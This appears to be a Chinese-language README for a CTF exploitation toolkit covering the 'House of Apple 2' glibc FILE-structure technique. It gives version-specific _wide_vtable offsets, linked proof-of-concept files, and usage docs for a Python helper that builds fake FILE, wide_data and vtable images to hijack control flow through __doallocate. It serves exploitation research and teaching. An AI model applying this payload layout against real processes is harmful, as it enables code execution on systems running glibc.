# House of Apple 2

## 结论

- 适用范围：**2.24～2.43（最终触发点）；投递原语需另选**。
- 原语/效果：保留合法的主 vtable，利用未被单独校验的 `_wide_data->_wide_vtable`，经 `_IO_wfile_overflow→_IO_wdoallocbuf` 调用受控 `doallocate`。
- 版本变化：2.24 起使用合法 `_IO_wfile_jumps`；`_wide_vtable` 字段偏移在 2.24～2.29 / 2.30 / 2.31+ 分别是 `0x130 / 0xf0 / 0xe0`；2.34 hooks 删除不影响最终触发点；2.42/2.43 仍从 fake wide vtable 取 doallocate，但经典 largebin 投递已失效。

<!-- PRIMITIVE_REQUIREMENTS:START -->
## 原语要求与版本边界

| 项目 | 本手法要求 |
|---|---|
| 最小输入原语 / 信息 | 能覆盖/投递 fake FILE 与 wide data；能触发 wide overflow |
| 关键环境与不变量 | 合法 `_IO_wfile_jumps`；可控 fake wide vtable；x86-64 wide ABI |
| 最终输出原语 | `doallocate(fp)` 间接调用/CF |
| 版本边界应如何理解 | 2.30、2.31 只改 `_wide_vtable` 偏移，属于适配；2.42 切断经典 largebin 投递，但最终触发点到 2.43 仍在。 |
<!-- PRIMITIVE_REQUIREMENTS:END -->

## 从源码看

`libio/libioP.h` 的 WJUMP、`libio/wfileops.c`，以及 `libio/libio.h` 中 `_IO_wide_data/_IO_iconv_t` 的布局。2.30 的 [`09e1b0e`](https://sourceware.org/git/?p=glibc.git;a=commit;h=09e1b0e3f6facc1af2dbcfef204f0aaa8718772b) 删除 legacy codecvt 函数表；2.31 的 [`70c6e15`](https://sourceware.org/git/?p=glibc.git;a=commit;h=70c6e15654928c603c6d24bd01cf62e7a8e2ce9b) 又缩小 `_IO_iconv_t`。

源码中仍能走到最终触发点，不等于旧利用链仍成立：投递方式、私有结构和控制流终点都要按附件 libc/ld 的 Build ID 复核。

源码与背景：

- [glibc 2.43 `libio/wfileops.c`](https://sourceware.org/cgit/glibc/tree/libio/wfileops.c?h=release/2.43/master)
- [glibc 2.43 `_IO_wide_data` 定义](https://sourceware.org/cgit/glibc/tree/libio/libio.h?h=release/2.43/master)
- [House of Apple 2 原始文章](https://roderickchan.github.io/zh-cn/house-of-apple-%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84glibc%E4%B8%ADio%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95-2/)
- [GNU glibc 当前开发分支](https://github.com/bminor/glibc/tree/master)
- [House of all 综述](https://roderickchan.github.io/zh-cn/2023-02-27-house-of-all-about-glibc-heap-exploitation/)
- [高版本 heap exploitation](https://roderickchan.github.io/zh-cn/2023-03-01-analysis-of-glibc-heap-exploitation-in-high-version/)

## PoC

- [`poc_sink_2.24_2.29.c`](./poc_sink_2.24_2.29.c)：可执行最终触发点；真实经过合法 primary vtable，使用 `wide->_wide_vtable=wide+0x130` 调用 fake doallocate。
- [`poc_sink_2.30.c`](./poc_sink_2.30.c)：可执行 2.30 过渡 ABI，偏移 `+0xf0`。
- [`poc_sink_2.31_2.43.c`](./poc_sink_2.31_2.43.c)：可执行现代 ABI，偏移 `+0xe0`；2.43 端点已实跑。

三份 C 文件已经直接写出各自 ABI 的 fake FILE、wide data 和 fake wide vtable 字段，不再另存重复的布局生成器。2.42～2.43 继续使用 `+0xe0`，但投递原语必须另选。

## Python 离线板子

[`apple2.py`](./apple2.py) 提供 `build_house_of_apple2`，生成 Apple2 最终消费点的对象布局。

### 函数用途

构造以下调用链所需的对象：

```text
__woverflow(fp, L'A')
  -> primary vtable 的 _IO_wfile_overflow
  -> _IO_wdoallocbuf(fp)
  -> fake wide_data->_wide_vtable->__doallocate(fp)
  -> callback
```

### 最小使用示例

```python
from apple2 import build_house_of_apple2

# 占位地址：题目中换成 libc_base + 偏移 / 已泄露地址
writes = build_house_of_apple2(
    "2.35",
    file_addr=0x100000,          # fake FILE 地址
    fake_wide_data_addr=0x200000,  # fake wide_data 地址
    fake_wide_vtable_addr=0x201000,  # fake wide vtable 地址
    callback_addr=0x401234,      # doallocate 回调
    wfile_jumps_addr=0x7fff0000, # 合法 _IO_wfile_jumps
    narrow_buffer_addr=0x300000, # 窄字符缓冲区
)

# 返回 3 个 MemoryWrite：FILE、wide_data、wide_vtable 三个完整对象镜像
for w in writes:
    print(w.label, hex(w.address), w.data.hex())

# 交给题目的任意写：write_primitive(w.address, w.data)
```

### 对应 PoC

- [`poc_sink_2.24_2.29.c`](./poc_sink_2.24_2.29.c)；
- [`poc_sink_2.30.c`](./poc_sink_2.30.c)；
- [`poc_sink_2.31_2.43.c`](./poc_sink_2.31_2.43.c)。

### 版本与 ABI 偏移

| glibc | `_wide_data->_wide_vtable` 偏移 |
|---|---|
| 2.24～2.29 | `+0x130` |
| 2.30 | `+0xf0` |
| 2.31～2.43 | `+0xe0` |

`_IO_jump_t.__doallocate` 固定位于 vtable `+0x68`。

### 参数

| 参数 | 含义 |
|---|---|
| `version` | 目标 glibc 版本，支持 `2.24`～`2.43`。 |
| `file_addr` | fake FILE 或被覆盖 FILE 地址。 |
| `fake_wide_data_addr` | fake `_IO_wide_data` 地址，写入 `FILE+0xa0`。 |
| `fake_wide_vtable_addr` | fake wide vtable 地址，写入 fake wide_data 的版本对应槽位。 |
| `callback_addr` | `__doallocate` 回调地址，写入 fake wide vtable `+0x68`。 |
| `wfile_jumps_addr` | 目标 libc 合法 `_IO_wfile_jumps` 地址，写入 `FILE+0xd8`。 |
| `narrow_buffer_addr` | fake FILE 的窄字符缓冲区地址；函数按 `+0x20` 生成结束地址。 |
| `current_flags` | 当前 `_flags` 值；传入后清除 `NO_WRITES | UNBUFFERED | CURRENTLY_PUTTING`，未知时省略。 |

### 返回对象

返回 3 个 `MemoryWrite`，分别是完整的 FILE、wide_data 和 wide_vtable 镜像。
`MemoryWrite` 每个成员含义：

| 成员 | 含义 |
|---|---|
| `address` | 要写入的绝对地址。 |
| `data` | 要写入的小端字节串（`bytes`）。 |
| `label` | 该写入的用途标签，用于调试和识别。 |

各 payload 对象：

```text
FILE 字段写入（file_addr 处）：
    +0x00  _flags（可选，4 字节）
    +0xa0  _wide_data = fake_wide_data_addr
    +0xd8  vtable = wfile_jumps_addr
    +0xc0  _mode = 1
    +0x08/+0x10/+0x18  _IO_read_base/_ptr/_end = narrow_buffer_addr
    +0x20/+0x28/+0x30  _IO_write_base/_ptr/_end = narrow_buffer_addr（end 为 +0x20）
    +0x38/+0x40  _IO_buf_base/_end = narrow_buffer_addr（end 为 +0x20）

fake wide_data（fake_wide_data_addr 处）：
    零填充到 _wide_vtable 槽，槽值 = fake_wide_vtable_addr

fake wide_vtable（fake_wide_vtable_addr 处）：
    零填充到 +0x68，槽值 = callback_addr
```

使用时对每个 `w in writes` 执行 `write_primitive(w.address, w.data)` 即可；
调用者不需要自己拼接十几个 FILE 字段补丁。

### 调用者必须提供

```text
libc 基址和 _IO_wfile_jumps 地址
能投递 fake FILE / 覆盖现有 FILE 的原语
能触发 __woverflow 或等价 wide overflow 的入口
```

### 函数不负责

```text
不把 fake FILE 挂到 _IO_list_all
不负责 largebin 等投递原语
不触发 __woverflow
不处理 callback 的实际 RCE/ORW 逻辑
```

## 迁移与调试

1. 先确认投递路径和最终触发点在目标 Build ID 中都存在。
2. 把占位地址和 add/edit/free 顺序替换成题目能力。
3. 在消费函数下断点，逐字段核对 size、对齐、safe-linking、FILE/link_map 私有布局。
